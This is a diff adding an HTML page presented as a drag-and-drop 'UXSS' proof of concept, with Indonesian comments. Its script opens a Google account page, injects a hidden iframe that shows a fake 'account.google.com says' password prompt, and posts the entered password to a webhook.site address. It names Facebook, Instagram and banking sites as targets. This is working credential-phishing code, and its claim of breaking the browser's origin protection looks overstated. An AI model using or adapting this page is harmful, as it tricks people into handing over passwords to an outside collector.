@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Drag & Drop UXSS PoC</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 32px;
+      font-family: system-ui, sans-serif;
+      background: #111;
+      color: #eee;
+      text-align: center;
+    }
+    h1 { color: #4ade80; margin: 0 0 8px; }
+    p { opacity: .85; font-size: 14px; }
+    .btn {
+      display: inline-block;
+      padding: 14px 18px;
+      border-radius: 10px;
+      background: #222;
+      color: #fff;
+      text-decoration: none;
+      border: 1px solid #333;
+      user-select: none;
+      cursor: grab;
+      font-weight: 500;
+    }
+    .btn:hover { background: #1a1a1a; }
+    .danger { background: #ff4444 !important; }
+    .note { margin-top: 24px; font-size: 13px; opacity: .8; }
+  </style>
+</head>
+<body>
+  <h1>Drag to Bookmark Bar</h1>
+  <p>Seret tautan di bawah ke <b>bookmark bar</b> → klik untuk menjalankan.</p>
+
+  <!-- SATU-SATUNYA ELEMEN: href="#" + onclick -->
+  <a href="#" onclick="runExploit(); return false;" class="btn danger">Drag Me!</a>
+
+  <div class="note">
+    Target: <code>facebook.com</code>, <code>instagram.com</code>, <code>banking.com</code>, dll.
+  </div>
+
+  <script>
+    function runExploit() {
+      // Buka Google Account (spoof origin)
+      const w = window.open('https://account.google.com/', '_blank');
+      if (!w) { alert('Popup blocked!'); return; }
+
+      setTimeout(() => {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+
+        iframe.src = 'data:text/html,' + encodeURIComponent(`
+          <script>
+            setTimeout(() => {
+              let p;
+              while (!(p = prompt("account.google.com says\\n\\nPassword:")) || p.trim() === "") {
+                if (p === null) return;
+                alert("Password required!");
+              }
+              const f = document.createElement('form');
+              f.method = 'POST';
+              f.action = 'https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit';
+              const i = document.createElement('input');
+              i.type = 'hidden'; i.name = 'password'; i.value = p;
+              f.appendChild(i); document.body.appendChild(f); f.submit();
+              setTimeout(() => alert("haha pwned!\\nPassword: " + p), 400);
+            }, 1000);
+          </script>
+        `);
+
+        document.body.appendChild(iframe);
+
+        setTimeout(() => {
+          if (document.body.contains(iframe)) document.body.removeChild(iframe);
+          if (w && !w.closed) w.close();
+        }, 8000);
+
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
